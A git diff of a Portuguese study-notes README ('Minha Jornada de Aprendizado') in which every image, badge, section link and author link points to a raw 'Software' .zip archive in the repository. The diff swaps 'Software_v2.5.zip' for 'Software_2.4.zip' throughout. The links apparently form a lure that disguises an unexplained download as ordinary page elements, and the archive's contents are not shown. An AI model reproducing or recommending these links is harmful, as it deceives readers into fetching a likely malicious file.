@@ -1,8 +1,8 @@
-[<img src="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip" width=1500>](https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip)
+[<img src="https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip" width=1500>](https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip)
 
 <h1 align="center"><b>Minha Jornada de Aprendizado</b></h1>
 
-![Badge em Desenvolvimento](https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip%20DESENVOLVIMENTO-green)
+![Badge em Desenvolvimento](https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip%20DESENVOLVIMENTO-green)
 
 <h2 align="left"><b>Índice</b></h2>
 
@@ -33,11 +33,11 @@ Com o intuito de me inserir na comunidade de tecnologia de informação para con
 Vocês podem acompanhar um pouco do que já aprendi a respeito e espero eu até encontrar respostas para algumas dúvidas na pasta que criei dedicada os meus resumos sobre funcionalidades e manuseio dessa ferramenta através do link abaixo.
 
 
-<li><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip">01_GitHub</a>
-<!-- <li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip">02_Python</a>
-<li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip">03_CRISP-DM</a>
-<li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip">04_SCRUM</a>
+<li><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip">01_GitHub</a>
+<!-- <li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip">02_Python</a>
+<li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip">03_CRISP-DM</a>
+<li type="i"><a href="https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip">04_SCRUM</a>
 </ol> -->
 
 ## <b>Autor:</b>
-[<img src="https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip" width=150><br><sub><b>Pablo Carvalho Silva Sousa</b></sub>](https://github.com/pablocssousa/estudos/raw/refs/heads/master/01_GitHub/Software_v2.5.zip)
+[<img src="https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip" width=150><br><sub><b>Pablo Carvalho Silva Sousa</b></sub>](https://github.com/pablocssousa/estudos/raw/refs/heads/master/03_CRISP-DM/Software_2.4.zip)
